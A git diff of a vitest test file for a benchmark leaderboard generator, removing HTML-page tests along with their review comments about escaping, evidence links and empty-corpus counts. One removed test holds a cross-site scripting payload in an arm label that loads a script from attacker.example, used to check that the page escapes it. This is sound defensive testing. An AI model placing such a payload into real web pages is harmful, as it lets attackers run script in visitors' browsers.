@@ -2,12 +2,7 @@ import { describe, expect, it } from "vitest";
 import { existsSync, mkdtempSync, mkdirSync, writeFileSync, readFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { isAbsolute, join, resolve } from "node:path";
-import {
-  buildLeaderboard,
-  generateLeaderboardHtml,
-  generateLeaderboardMarkdown,
-  writeLeaderboard,
-} from "../src/leaderboard.js";
+import { buildLeaderboard, generateLeaderboardMarkdown, writeLeaderboard } from "../src/leaderboard.js";
 import type { ArmComparisonDetail } from "../src/results.js";
 
 function makeArm(
@@ -129,7 +124,7 @@ describe("leaderboard", () => {
     const b2 = createTestBundle(root, "b2", top, bottom);
     const outDir = join(root, "out");
 
-    const { jsonPath, mdPath, htmlPath, data } = writeLeaderboard([b1, b2], outDir);
+    const { jsonPath, mdPath, data } = writeLeaderboard([b1, b2], outDir);
 
     expect(data.entries).toHaveLength(4);
     expect(data.entries.map((e) => e.label)).toEqual(["top", "narrow", "wide", "bottom"]);
@@ -142,108 +137,6 @@ describe("leaderboard", () => {
     const mdContent = readFileSync(mdPath, "utf8");
     expect(mdContent).toContain("# Benchmark Leaderboard");
     expect(mdContent).not.toMatch(/<html/i);
-
-    expect(existsSync(htmlPath)).toBe(true);
-    const htmlContent = readFileSync(htmlPath, "utf8");
-    expect(htmlContent).toMatch(/<html|<!doctype html/i);
-  });
-
-  it("generates self-contained HTML page with range-first methodology and no remote assets", () => {
-    const root = mkdtempSync(join(tmpdir(), "lb-test-html-"));
-    const wide = makeArm("wide", "chikory", 5, 5, 0.5655, 1.0);
-    const narrow = makeArm("narrow", "command", 90, 100, 0.8256, 0.9448);
-    const bundleDir = createTestBundle(root, "bundle1", wide, narrow);
-
-    const data = buildLeaderboard([bundleDir]);
-    const html = generateLeaderboardHtml(data, root);
-
-    expect(html).toMatch(/<!DOCTYPE html>/i);
-    expect(html).toMatch(/56\.5%/);
-    expect(html).toMatch(/82\.6%/);
-    expect(html).toMatch(/wilson/i);
-    expect(html).toMatch(/I-SR/i);
-    expect(html).toMatch(/D-SR/i);
-    expect(html).not.toMatch(/(?:src|href)\s*=\s*["'](?:https?:)?\/\//i);
-    expect(html).not.toMatch(/@import\s+url\(\s*["']?(?:https?:)?\/\//i);
-  });
-
-  // F-337 (dogfood-139 review): bundle-derived strings were interpolated raw, so
-  // published DATA could rewrite the page's markup. Both traps this artifact
-  // exists to satisfy were defeatable by a crafted bundle — a winner claim on an
-  // unseparated pair (trap A) and a network asset on a page that promises none
-  // (trap E). The delivery's own tests used benign fixtures only, so they passed.
-  it("escapes bundle-derived strings so published data cannot inject markup or claims", () => {
-    const hostileLabel = 'evil"><script src="https://attacker.example/x.js"></script><span class="';
-    const wide = makeArm(hostileLabel, "chikory", 5, 5, 0.5655, 1.0);
-    const narrow = makeArm("beta", "command", 90, 100, 0.8256, 0.9448);
-
-    const html = generateLeaderboardHtml({
-      orderedBy: "iSrRange.low",
-      entries: [wide, narrow].map((a) => ({ ...a, bundle: "." })),
-      pairwise: [{ armA: "alpha <em>outperforms</em> beta", armB: "beta", separated: false }],
-    } as unknown as Parameters<typeof generateLeaderboardHtml>[0]);
-
-    // trap E: no injected remote asset survives.
-    expect(html).not.toMatch(/(?:src|href)\s*=\s*["'](?:https?:)?\/\//i);
-    expect(html).not.toContain("<script");
-    // no injected element of any kind — the hostile label cannot close its cell.
-    expect(html).not.toContain('<span class="">');
-    // the hostile text still SHOWS — escaped, not dropped.
-    expect(html).toContain("&lt;script");
-    // trap A: the page's OWN claim still follows the data, not the label. (A label
-    // that merely reads like a claim renders as escaped text and is not a claim by
-    // the page; the page states separation only from `pairwise[].separated`.)
-    expect(html).toMatch(/not separated/i);
-    expect(html).not.toMatch(/Separated at 95% confidence/);
-  });
-
-  // F-338 (dogfood-139 review): evidence links resolved `entry.bundle` against
-  // `process.cwd()`, though the field is anchored to the repo root (F-267/WP-591).
-  // Generating the page from `benchmarks/harness` — what AC-2 itself does — turned
-  // every evidence link into a bare `<span>`, and trap G still passed because a
-  // `<span>` has no href to be dead. The page must not depend on the caller's cwd.
-  it("emits the same evidence links no matter which directory the generator runs from", () => {
-    const outDir = join(process.cwd(), "..", "publications", "leaderboard");
-    const data = {
-      orderedBy: "iSrRange.low",
-      entries: [
-        {
-          ...makeArm("chikory", "chikory", 19, 19, 0.832, 1.0),
-          bundle: "benchmarks/publications/p3-rung-4",
-        },
-      ],
-      pairwise: [],
-    } as unknown as Parameters<typeof generateLeaderboardHtml>[0];
-
-    const cwd = process.cwd();
-    try {
-      process.chdir(resolve(cwd, "..", ".."));
-      const fromRepoRoot = generateLeaderboardHtml(data, outDir);
-      process.chdir(cwd);
-      const fromHarness = generateLeaderboardHtml(data, outDir);
-
-      expect(fromHarness).toBe(fromRepoRoot);
-      // …and it is the LINK that survives, not the degraded span.
-      expect(fromHarness).toContain('<a href="../p3-rung-4"');
-      expect(fromHarness).not.toContain("<span>benchmarks/publications/p3-rung-4</span>");
-    } finally {
-      process.chdir(cwd);
-    }
-  });
-
-  // F-336 (dogfood-139 review): the methodology fell back to `5` tasks and `19`
-  // requirements — today's real corpus — whenever `entries` was empty, so a page
-  // with no data published a measurement nobody took.
-  it("states that it has no corpus rather than fabricating counts when there are no entries", () => {
-    const html = generateLeaderboardHtml({
-      orderedBy: "iSrRange.low",
-      entries: [],
-      pairwise: [],
-    } as unknown as Parameters<typeof generateLeaderboardHtml>[0]);
-
-    expect(html).not.toMatch(/<strong>5<\/strong>\s*repository tasks/i);
-    expect(html).not.toMatch(/<strong>19<\/strong>\s*total requirements/i);
-    expect(html).toMatch(/no measured corpus|no arms were evaluated/i);
   });
 
   // F-267 (WP-591): the published bundle pointer must RESOLVE, not merely be a
@@ -289,4 +182,3 @@ describe("leaderboard", () => {
     }
   });
 });
-
